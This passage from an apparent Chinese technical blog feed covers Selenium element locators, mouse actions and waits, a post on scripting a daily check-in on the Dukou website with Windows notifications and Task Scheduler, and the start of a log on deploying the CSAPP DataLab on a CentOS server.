class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cheese = driver.find_element(By.PARTIAL_LINK_TEXT, <span class="string">"cheese"</span>)</span><br></pre></td></tr></table></figure><h2 id="47-css-selector"><a class="markdownIt-Anchor" href="#47-css-selector"></a> 4.7 css selector</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"food"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"dairy"</span>&gt;</span>milk<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"dairy aged"</span>&gt;</span>cheese<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/04/11/Ph9O4gL1FSVA2D3.png" width="800" height="300" alt="图片名称" align="center" id="139"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cheese = driver.find_element(By.CSS_SELECTOR, <span class="string">"#food span.dairy.aged"</span>)</span><br></pre></td></tr></table></figure><h2 id="48-xpath"><a class="markdownIt-Anchor" href="#48-xpath"></a> 4.8 xpath</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"example"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">INPUT</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"other"</span> /&gt;</span></span><br></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/04/11/rvxGgYde3ANzWoF.png" width="800" height="300" alt="图片名称" align="center" id="140"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inputs = driver.find_elements(By.XPATH, <span class="string">"//input"</span>)</span><br></pre></td></tr></table></figure><h1 id="5-鼠标动作链"><a class="markdownIt-Anchor" href="#5-鼠标动作链"></a> 5 鼠标动作链</h1><p>有些时候，我们需要再页面上模拟一些鼠标操作，比如双击、右击、拖拽甚至按住不动等，我们可以通过导入 <code>ActionChains</code> 类来做到：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#导入 ActionChains 类</span></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver <span class="keyword">import</span> ActionChains</span><br><span class="line"></span><br><span class="line"><span class="comment"># 鼠标移动到 ac 位置</span></span><br><span class="line">ac = driver.find_element_by_xpath(<span class="string">'element'</span>)</span><br><span class="line">ActionChains(driver).move_to_element(ac).perform()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 ac 位置单击</span></span><br><span class="line">ac = driver.find_element_by_xpath(<span class="string">"elementA"</span>)</span><br><span class="line">ActionChains(driver).move_to_element(ac).click(ac).perform()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 ac 位置双击</span></span><br><span class="line">ac = driver.find_element_by_xpath(<span class="string">"elementB"</span>)</span><br><span class="line">ActionChains(driver).move_to_element(ac).double_click(ac).perform()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 ac 位置右击</span></span><br><span class="line">ac = driver.find_element_by_xpath(<span class="string">"elementC"</span>)</span><br><span class="line">ActionChains(driver).move_to_element(ac).context_click(ac).perform()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 ac 位置左键单击hold住</span></span><br><span class="line">ac = driver.find_element_by_xpath(<span class="string">'elementF'</span>)</span><br><span class="line">ActionChains(driver).move_to_element(ac).click_and_hold(ac).perform()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 ac1 拖拽到 ac2 位置</span></span><br><span class="line">ac1 = driver.find_element_by_xpath(<span class="string">'elementD'</span>)</span><br><span class="line">ac2 = driver.find_element_by_xpath(<span class="string">'elementE'</span>)</span><br><span class="line">ActionChains(driver).drag_and_drop(ac1, ac2).perform()</span><br></pre></td></tr></table></figure><h1 id="6-页面等待"><a class="markdownIt-Anchor" href="#6-页面等待"></a> 6 页面等待</h1><p>现在的网页越来越多采用了 Ajax 技术，这样程序便不能确定何时某个元素完全加载出来了。如果实际页面等待时间过长导致某个dom元素还没出来，但是你的代码直接使用了这个WebElement，那么就会抛出NullPointer的异常。</p><p>为了避免这种元素定位困难而且会提高产生 ElementNotVisibleException 的概率。所以 Selenium 提供了两种等待方式，一种是隐式等待，一种是显式等待。</p><p>隐式等待是等待特定的时间，显式等待是指定某一条件直到这个条件成立时继续执行。</p><h2 id="61-显式等待"><a class="markdownIt-Anchor" href="#61-显式等待"></a> 6.1 显式等待</h2><p>显式等待指定某个条件，然后设置最长等待时间。如果在这个时间还没有找到元素，那么便会抛出异常了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="comment"># WebDriverWait 库，负责循环等待</span></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="comment"># expected_conditions 类，负责条件出发</span></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome()</span><br><span class="line">driver.get(<span class="string">"http://www.xxxxx.com/loading"</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 页面一直循环，直到 id="myDynamicElement" 出现</span></span><br><span class="line">    element = WebDriverWait(driver, <span class="number">10</span>).until(</span><br><span class="line">        EC.presence_of_element_located((By.ID, <span class="string">"myDynamicElement"</span>))</span><br><span class="line">    )</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    driver.quit()</span><br></pre></td></tr></table></figure><p>如果不写参数，程序默认会 0.5s 调用一次来查看元素是否已经生成，如果本来元素就是存在的，那么会立即返回。</p><p>下面是一些内置的等待条件，你可以直接调用这些条件，而不用自己写某些等待条件了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">title_is</span><br><span class="line">title_contains</span><br><span class="line">presence_of_element_located</span><br><span class="line">visibility_of_element_located</span><br><span class="line">visibility_of</span><br><span class="line">presence_of_all_elements_located</span><br><span class="line">text_to_be_present_in_element</span><br><span class="line">text_to_be_present_in_element_value</span><br><span class="line">frame_to_be_available_and_switch_to_it</span><br><span class="line">invisibility_of_element_located</span><br><span class="line">element_to_be_clickable – it <span class="keyword">is</span> Displayed <span class="keyword">and</span> Enabled.</span><br><span class="line">staleness_of</span><br><span class="line">element_to_be_selected</span><br><span class="line">element_located_to_be_selected</span><br><span class="line">element_selection_state_to_be</span><br><span class="line">element_located_selection_state_to_be</span><br><span class="line">alert_is_present</span><br></pre></td></tr></table></figure><h2 id="62-隐式等待"><a class="markdownIt-Anchor" href="#62-隐式等待"></a> 6.2 隐式等待</h2><p>隐式等待比较简单，就是简单地设置一个等待时间，单位为秒。当然如果不设置，默认等待时间为0。</p><p>上面的样例就使用的这种等待方式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome()</span><br><span class="line">driver.implicitly_wait(<span class="number">10</span>) <span class="comment"># seconds</span></span><br><span class="line">driver.get(<span class="string">"http://www.xxxxx.com/loading"</span>)</span><br><span class="line">myDynamicElement = driver.find_element_by_id(<span class="string">"myDynamicElement"</span>)</span><br></pre></td></tr></table></figure><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li><a href="https://www.yiibai.com/selenium/selenium-basic-terminology.html" target="_blank" rel="noopener">Selenium教程</a></li><li><a href="https://zhuanlan.zhihu.com/p/366773104" target="_blank" rel="noopener">Python 爬虫进阶篇——Selenium教程（一）</a></li><li><a href="https://www.jianshu.com/p/6c82c965c014" target="_blank" rel="noopener">简书-selenium教程</a></li><li><a href="https://yuaneuro.cn/archives/3.html" target="_blank" rel="noopener">python用selenium爬取百度搜索结果</a></li><li><a href="https://zhuanlan.zhihu.com/p/88152781" target="_blank" rel="noopener">python爬虫之selenium模拟浏览器</a></li><li><a href="https://zhuanlan.zhihu.com/p/111859925" target="_blank" rel="noopener">Selenium Python 教程</a></li><li><a href="https://blog.csdn.net/langdei/article/details/102883424" target="_blank" rel="noopener">python 爬虫（九）selenium常用方法总结</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> selenium </tag>
            
            <tag> 待补充 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dukou网站自动化签到</title>
      <link href="/2022/04/10/Dukou%E7%BD%91%E7%AB%99%E8%87%AA%E5%8A%A8%E5%8C%96%E7%AD%BE%E5%88%B0/"/>
      <url>/2022/04/10/Dukou%E7%BD%91%E7%AB%99%E8%87%AA%E5%8A%A8%E5%8C%96%E7%AD%BE%E5%88%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-问题需求"><a class="markdownIt-Anchor" href="#1-问题需求"></a> 1 问题需求</h1><p>登陆Dukou网站，点击签到按钮，每天执行此操作。</p><h1 id="2-解决"><a class="markdownIt-Anchor" href="#2-解决"></a> 2 解决</h1><p>解决方法有两个：</p><ol><li>利用selenium编写浏览器爬虫，模拟执行操作；然后利用Windows自带的<code>任务计划程序</code>实现定时执行爬虫；</li><li>编写ios快捷指令</li></ol><h2 id="21-windows自动执行"><a class="markdownIt-Anchor" href="#21-windows自动执行"></a> 2.1 Windows自动执行</h2><h3 id="211-爬虫脚本"><a class="markdownIt-Anchor" href="#211-爬虫脚本"></a> 2.1.1 爬虫脚本</h3><p><strong>参考</strong>：<a href="https://yuaneuro.cn/archives/3.html" target="_blank" rel="noopener">python用selenium爬取百度搜索结果</a></p><p><strong>dukou_sign_in.py</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dukou_sign</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 无头浏览器设置</span></span><br><span class="line">    co = webdriver.ChromeOptions()</span><br><span class="line">    co.headless = <span class="literal">False</span></span><br><span class="line">    browser = webdriver.Chrome(options=co)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 登陆</span></span><br><span class="line">    browser.implicitly_wait(<span class="number">20</span>)  <span class="comment"># 如果找不到元素，每隔半秒钟再去界面上查看一次， 直到找到该元素， 或者过了20秒最大时长。</span></span><br><span class="line">    url = <span class="string">'https://dukou.icu/user/index'</span>  <span class="comment"># 目标网站</span></span><br><span class="line">    browser.get(url)</span><br><span class="line">    sleep(<span class="number">5</span>)</span><br><span class="line">    username = <span class="string">"xxx"</span>  <span class="comment"># dukou用户名</span></span><br><span class="line">    password = <span class="string">"xxx"</span>  <span class="comment"># dukou密码</span></span><br><span class="line">    browser.find_element(by=By.ID, value=<span class="string">"email"</span>).send_keys(username)  <span class="comment"># 输入框</span></span><br><span class="line">    browser.find_element(by=By.ID, value=<span class="string">"passwd"</span>).send_keys(password)  <span class="comment">#</span></span><br><span class="line">    browser.find_element(by=By.XPATH, value=<span class="string">'//*[@id="formLogin"]/div[3]/div/div/span/button'</span>).click()  <span class="comment"># 点击登陆按钮</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 进行签到</span></span><br><span class="line">    sleep(<span class="number">5</span>)</span><br><span class="line">    browser.find_element(by=By.XPATH, value=<span class="string">'//*[@id="app"]/section/section/main/div/div[2]/div/div/div/div[2]/div[3]'</span></span><br><span class="line">                                            <span class="string">'/div/div/button[1]'</span>).click()  <span class="comment"># 点击签到</span></span><br><span class="line">    <span class="comment"># 停止爬虫</span></span><br><span class="line">    browser.quit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    dukou_sign()</span><br></pre></td></tr></table></figure><hr><p>selenium打开指定URL后，需要登陆：</p><img src="https://s2.loli.net/2022/04/10/bLCpikNS1GY3unM.png" width="600" height="400" alt="图片名称" align="center" id="127"><p>在此页面按F12，找到对应输入框的<code>id</code></p><img src="https://s2.loli.net/2022/04/10/toCgMNPVl6ExiJj.png" width="800" height="300" alt="图片名称" align="center" id="128"><p>然后通过ID定位element，并发送对应内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">browser.find_element(by=By.ID, value=<span class="string">"email"</span>).send_keys(username)</span><br><span class="line">browser.find_element(by=By.ID, value=<span class="string">"passwd"</span>).send_keys(password)</span><br></pre></td></tr></table></figure><p>下一步点击<code>确定</code>按钮，通过XPATH定位element，并进行点击：</p><img src="https://s2.loli.net/2022/04/10/rhKxLbaFgdlpI6W.png" width="800" height="300" alt="图片名称" align="center" id="129"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">browser.find_element(by=By.XPATH, value=<span class="string">'//*[@id="formLogin"]/div[3]/div/div/span/button'</span>).click()</span><br></pre></td></tr></table></figure><p>登陆后，点击<code>签到</code>按钮与上面点击<code>确定</code>按钮类似：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">browser.find_element(by=By.XPATH, value=<span class="string">'//*[@id="app"]/section/section/main/div/div[2]/div/div/div/div[2]/div[3]'</span></span><br><span class="line">                                            <span class="string">'/div/div/button[1]'</span>).click()  <span class="comment"># 点击签到</span></span><br></pre></td></tr></table></figure><h3 id="212-消息通知脚本"><a class="markdownIt-Anchor" href="#212-消息通知脚本"></a> 2.1.2 消息通知脚本</h3><p>爬虫脚本执行完，需要消息提醒，提高体验。</p><p>通过 <strong>win10toast</strong> 实现在 Win10 系统中发送桌面消息通知，<a href="https://zhuanlan.zhihu.com/p/350300654" target="_blank" rel="noopener">参考</a></p><p>安装 win10toast：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install win10toast</span><br></pre></td></tr></table></figure><p>代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> win10toast <span class="keyword">import</span> ToastNotifier</span><br><span class="line"></span><br><span class="line">toaster = ToastNotifier()</span><br><span class="line">toaster.show_toast(<span class="string">"Dukou自动签到"</span>,</span><br><span class="line">                   <span class="string">"签到成功！"</span>,</span><br><span class="line">                   icon_path=<span class="string">"./img/dukou.ico"</span>,</span><br><span class="line">                   duration=<span class="number">60</span>*<span class="number">60</span>*<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>但是这种方法发送的消息会在一定的时间内消失（由参数<code>duration</code>指定，单位是秒），不会在<code>管理通知</code>中保存；如果将参数<code>duration</code>改的足够大，消息可以&quot;永存&quot;，但是后台会持续运行该程序，不太理想。</p><p>下面的程序解决了上面的问题，参考<a href="https://github.com/jithurjacob/Windows-10-Toast-Notifications/issues/76" target="_blank" rel="noopener">how to storage notifications into Action center</a></p><p><strong>dukou_notice.py</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> winrt.windows.ui.notifications <span class="keyword">import</span> ToastNotificationManager, ToastNotification</span><br><span class="line"><span class="keyword">import</span> winrt.windows.data.xml.dom <span class="keyword">as</span> dom</span><br><span class="line"></span><br><span class="line">notifier = ToastNotificationManager.create_toast_notifier(<span class="string">r'D:\developer\Python\python399\python.exe'</span>)  <span class="comment"># python程序路径</span></span><br><span class="line"></span><br><span class="line">title = <span class="string">"Dukou自动签到"</span></span><br><span class="line">desp = <span class="string">"签到成功！"</span></span><br><span class="line">tString = <span class="string">"""&lt;toast duration='short'&gt;&lt;audio src  = 'ms-winsoundevent:Notification.Reminder' loop = 'false' silent = 'false'/&gt;&lt;visual&gt;&lt;binding template='ToastText02'&gt;&lt;text id="1"&gt;"""</span> + title + <span class="string">"""&lt;/text&gt;&lt;text id="2"&gt;"""</span> + desp + <span class="string">"""&lt;/text&gt;&lt;/binding&gt;&lt;/visual&gt;&lt;/toast&gt;"""</span></span><br><span class="line"></span><br><span class="line">xDoc = dom.XmlDocument()</span><br><span class="line">xDoc.load_xml(tString)</span><br><span class="line">notifier.show(ToastNotification(xDoc))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p><strong>注意</strong>：<code>dukou_notice.py</code> 脚本不能与 <code>dukou_sign_in.py</code> 脚本合在一个文件内，否则会报错：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_winrt.init_apartment()</span><br><span class="line">RuntimeError: 无法在设置线程模式后对其加以更改。</span><br></pre></td></tr></table></figure><h3 id="213-定时执行脚本"><a class="markdownIt-Anchor" href="#213-定时执行脚本"></a> 2.1.3 定时执行脚本</h3><p>使用Windows自带的<code>任务计划程序</code>实现定时执行脚本，具体参考 <a href="https://blog.csdn.net/Icesteam/article/details/112328159" target="_blank" rel="noopener">Window自带的定时自动执行程序</a></p><ol><li><p>在Windows搜索框输入<code>任务计划程序</code>找到这个软件并打开；</p></li><li><p>点击<code>创建任务</code>：</p><img src="https://s2.loli.net/2022/04/10/XfGe4wvulnDd8gV.png" width="800" height="300" alt="图片名称" align="center" id="130"></li><li><p><code>常规</code>部分，填写<code>名称</code>，勾选<code>不管用户是否登录都要运行</code>以及 <code>使用最高权限运行</code> ：</p><img src="https://s2.loli.net/2022/04/10/l7CUeAj9sc3BkTr.png" width="500" height="400" alt="图片名称" align="center" id="131"></li><li><p><code>触发器</code>部分，选择合适的触发条件：</p><img src="https://s2.loli.net/2022/04/10/l4YJQbhWKopZd2e.png" width="500" height="400" alt="图片名称" align="center" id="132"></li><li><p><code>操作</code>部分，这里运行的程序或者脚本，最好直接选择个bat来执行（bat名称和路径分开放），执行exe有时候会出错，bat里设置的是要执行的Python脚本（bat与python脚本同目录下）：</p><img src="https://s2.loli.net/2022/04/10/ZadxHV2C8P4bS5L.png" width="500" height="400" alt="图片名称" align="center" id="133"><p><strong>dukou.bat</strong>：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python dukou_sign_in.py</span><br><span class="line">python dukou_notice.py</span><br></pre></td></tr></table></figure></li><li><p><code>条件</code>和<code>设置</code>部分默认即可，然后点击确定即可，前端界面已经出现了设置的任务：</p><img src="https://s2.loli.net/2022/04/10/i64vxcqGRu7C1Kl.png" width="1000" height="100" alt="图片名称" align="center" id="134"></li><li><p>到此已经完成问题需求。</p></li></ol><h2 id="22-ios快捷指令未实现"><a class="markdownIt-Anchor" href="#22-ios快捷指令未实现"></a> 2.2 ios快捷指令（未实现）</h2>]]></content>
      
      
      <categories>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> selenium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP-Lab1-DataLab环境部署及题解</title>
      <link href="/2022/04/09/CSAPP-Lab1-DataLab%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2%E5%8F%8A%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/04/09/CSAPP-Lab1-DataLab%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2%E5%8F%8A%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-介绍"><a class="markdownIt-Anchor" href="#1-介绍"></a> 1 介绍</h1><p>该实验是《深入理解计算机系统》（英文缩写CSAPP）课程附带实验——Lab1：Data Lab。</p><p>大四下学期在做计组助教，需要部署Lab1，期间遇到了不少的问题，多亏了舍友的帮助，记录下。（🥦）</p><h1 id="2-环境部署"><a class="markdownIt-Anchor" href="#2-环境部署"></a> 2 环境部署</h1><p>部署时阅读<code>README</code>文件，包括子目录下的；项目使用Perl语言编写。</p><img src="https://s2.loli.net/2022/04/12/e1jI2T7b3QhiqyU.png" width="800" height="300" alt="图片名称" align="center" id="140"><h2 id="21-网站运行"><a class="markdownIt-Anchor" href="#21-网站运行"></a> 2.1 网站运行</h2><p>在项目主目录运行<code>make start</code>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-4-8-centos lab1]<span class="comment"># sudo make start</span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="comment"># start Data lab Online contest</span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line">(<span class="built_in">cd</span> contest; make start)</span><br><span class="line">make[1]: Entering directory <span class="string">'/root/Lab/lab1/contest'</span></span><br><span class="line">/bin/sh: ./contest-timer.pl: Permission denied</span><br><span class="line">/bin/sh: ./contest.pl: Permission denied</span><br><span class="line">make[1]: *** [Makefile:13: start] Error 1</span><br><span class="line">make[1]: Leaving directory <span class="string">'/root/Lab/lab1/contest'</span></span><br><span class="line">make: *** [Makefile:15: start] Error 2</span><br></pre></td></tr></table></figure><p>出现报错，是因为pl脚本无执行权限，需要加权限：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ./contest</span><br><span class="line">chmod +x *.pl</span><br></pre></td></tr></table></figure><p>之后报错：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Can<span class="string">'t locate CGI.pm in @INC (you may need to install the CGI module)</span></span><br></pre></td></tr></table></figure><p>原因是缺少CGI模块，<a href="https://blog.hostonnet.com/ah01215-cant-locate-cgi-pm-in-inc" target="_blank" rel="noopener">参考</a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install perl-CGI</span><br></pre></td></tr></table></figure><p>此时浏览器访问<code>http://服务器IP:8080/</code>，（<strong>注意服务器开启8080端口和8081端口</strong>)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Scoreboard for the Data Lab "Beat the Prof" Contest</span><br><span class="line">Warning: The instructor (Tiger) must submit an entry before the results of the contest can be displayed.</span><br><span class="line"></span><br><span class="line">To submit your instructor's entry: linux&gt; ./src/driver.pl -u "The Prof"</span><br></pre></td></tr></table></figure><p>这时候我们需要在后台执行提示的命令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-4-8-centos lab1]<span class="comment"># ./src/driver.pl -u "The Prof"</span></span><br><span class="line">-bash: ./src/driver.pl: Permission denied</span><br></pre></td></tr></table></figure><p>报错显示需要加权限：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/Lab/lab1/src</span><br><span class="line">chmod +x *.pl</span><br></pre></td></tr></table></figure><p>之后再次报错：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-4-8-centos lab1]<span class="comment"># ./src/driver.pl -u "The Prof"</span></span><br><span class="line">Can<span class="string">'t locate Driverlib.pm in @INC (you may need to install the Driverlib module) (@INC contains: . /usr/local/lib64/perl5 /usr/local/share/perl5 /usr/lib64/perl5/vendor_perl /usr/share/perl5/vendor_perl /usr/lib64/perl5 /usr/share/perl5) at ./src/driver.pl line 19.</span></span><br><span class="line"><span class="string">BEGIN failed--compilation aborted at ./src/driver.pl line 19.</span></span><br></pre></td></tr></table></figure><p>这里的显示<code>Driverlib.pm</code>不存在，将往年Lab中的该文件复制到<code>/usr/lib64/perl5</code>（可变，只要在报错提示中的<code>@INC</code>中即可），然后再次执行：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-4-8-centos lab1]<span class="comment"># ./src/driver.pl -u "The Prof"</span></span><br><span class="line">Can<span class="string">'t locate Driverhdrs.pm in @INC (you may need to install the Driverhdrs module) (@INC contains: . /usr/local/lib64/perl5 /usr/local/share/perl5 /usr/lib64/perl5/vendor_perl /usr/share/perl5/vendor_perl /usr/lib64/perl5 /usr/share/perl5) at /usr/lib64/perl5/Driverlib.pm line 13.</span></span><br><span class="line"><span class="string">BEGIN failed--compilation aborted at /usr/lib64/perl5/Driverlib.pm line 13.</span></span><br><span class="line"><span class="string">Compilation failed in require at ./src/driver.pl line 20.</span></span><br><span class="line"><span class="string">BEGIN failed--compilation aborted at ./src/driver.pl line 